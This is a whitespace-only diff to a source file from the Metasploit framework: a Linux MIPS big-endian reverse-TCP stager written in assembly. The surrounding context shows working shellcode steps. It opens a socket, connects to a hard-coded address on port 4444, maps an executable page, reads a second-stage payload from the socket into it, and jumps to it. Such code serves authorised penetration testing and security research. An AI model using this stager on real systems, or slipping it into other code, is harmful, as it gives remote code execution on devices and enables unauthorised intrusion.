@@ -1,11 +1,11 @@
 ##
-# 
+#
 #        Name: stager_sock_reverse
 #        Type: Stager
 #   Qualities: No Nulls out of the IP / Port data
 #   Platforms: Linux MIPS Big Endian
 #     Authors: juan vazquez <juan.vazquez [at] metasploit.com>
-#     License: 
+#     License:
 #
 #        This file is part of the Metasploit Exploit Framework
 #        and is subject to the same licenses and copyrights as
@@ -47,8 +47,9 @@ main:
 	slti    $a2, $zero, -1
 	li      $v0, 4183
 	syscall 0x40404
-	sw      $v0, -4($sp) # store the file descriptor for the socket on the stack
-	
+
+  sw      $v0, -4($sp) # store the file descriptor for the socket on the stack
+
 	# connect(sockfd, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.172.1")}, 16)
 	# a0: sockfd
 	# a1: addr = AF_INET (2)
@@ -68,7 +69,7 @@ main:
 	nor     $a2, $t4, $zero
 	li      $v0, 4170
 	syscall 0x40404
-	
+
 	# mmap(0xffffffff, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
 	# a0: addr = -1
 	# a1: lenght = 4096
@@ -91,6 +92,7 @@ main:
 	sw      $2, -5($t3)         # Doesn't use $sp directly to avoid nulls
 	li      $v0, 4090
 	syscall 0x40404
+
 	sw      $v0, -8($sp)        # Stores the mmap'ed address on the stack
 
 	# read(sockfd, addr, 4096)
@@ -117,7 +119,7 @@ main:
 	add     $a2, $t1, $0
 	li      $v0, 4147
 	syscall 0x40404
-	
+
 	# jmp to the stage
 	lw      $s1, -8($sp)
 	lw      $s2, -4($sp)
